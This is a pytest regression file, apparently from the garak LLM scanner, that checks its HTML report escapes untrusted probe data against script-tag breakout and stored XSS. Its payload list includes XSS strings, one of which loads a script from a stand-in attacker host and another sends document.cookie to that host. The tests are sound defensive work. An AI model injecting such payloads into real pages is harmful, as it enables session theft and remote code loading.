# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Regression tests for script tag breakout and XSS prevention in report_digest (CWE-79).

Ensures that HTML-sensitive characters (<, >, &) in probe payloads, target outputs,
and model metadata embedded in the HTML report template are safely escaped as JSON
unicode escapes, preventing HTML parser breakout and stored XSS.
"""

import json
import pytest

from garak.analyze.report_digest import _serialize_digest_json_for_script, build_html

ADVERSARIAL_XSS_PAYLOADS = [
    "</script><script>alert('XSS')</script>",
    "</script><script src='https://attacker.com/evil.js'></script>",
    "<script>fetch('http://attacker.com?c=' + document.cookie)</script>",
    "<img src=x onerror=alert(document.domain)>",
    "<!-- <script>alert(1)</script> -->",
    "<![CDATA[</script><script>]]>",
    "<svg/onload=alert('svg')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "\\u003cscript\\u003e",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    'Text with & ampersand and <brackets> and "quotes"',
    "Unicode: 日本語 / 中文 / Русский / 🚀 / \u2028 / \u2029",
]


@pytest.mark.parametrize("payload", ADVERSARIAL_XSS_PAYLOADS)
def test_serialize_escapes_html_metacharacters(payload):
    """Serialized JSON must not contain raw '<', '>', or '&' characters."""
    digest = {
        "entry_type": "digest",
        "meta": {"target_name": payload},
        "eval": {
            "group": {
                "probe.Class": {
                    "detector": {
                        "prompt": payload,
                        "output": payload,
                    }
                }
            }
        },
    }

    serialized = _serialize_digest_json_for_script(digest)

    assert (
        "<" not in serialized
    ), f"Raw '<' found in serialized output for payload: {payload}"
    assert (
        ">" not in serialized
    ), f"Raw '>' found in serialized output for payload: {payload}"
    assert (
        "&" not in serialized
    ), f"Raw '&' found in serialized output for payload: {payload}"
    assert (
        "\u2028" not in serialized
    ), "U+2028 line separator found in serialized output"
    assert (
        "\u2029" not in serialized
    ), "U+2029 paragraph separator found in serialized output"


@pytest.mark.parametrize("payload", ADVERSARIAL_XSS_PAYLOADS)
def test_serialize_roundtrip_fidelity(payload):
    """Escaped JSON must decode back to the exact original object via json.loads."""
    digest = {
        "entry_type": "digest",
        "payload": payload,
        "nested": {"key": payload, "list": [payload, 1, 2.5, True, None]},
    }

    serialized = _serialize_digest_json_for_script(digest)
    decoded = json.loads(serialized)

    assert decoded == [digest], "Decoded object does not match original digest"


def test_build_html_prevents_script_breakout():
    """Embedding an XSS payload inside build_html must not terminate the enclosing script tag."""
    xss_payload = "</script><script>alert('pwned')</script>"
    digest = {
        "entry_type": "digest",
        "meta": {"target_name": xss_payload},
        "eval": {},
    }

    html = build_html(digest)

    # In index.html, the script tag starts before __GARAK_INSERT_HERE__.
    # A raw '</script>' before the template's final </script> would close the block prematurely.
    # Count the number of '</script>' in the template vs output.
    # The output should only contain the single terminating '</script>' from the index.html template.
    assert (
        html.count("</script>") == 1
    ), "Unexpected </script> found in generated HTML, indicating script tag breakout"
    assert (
        "\\u003c/script\\u003e" in html
    ), "Escaped script tag should be present in HTML"
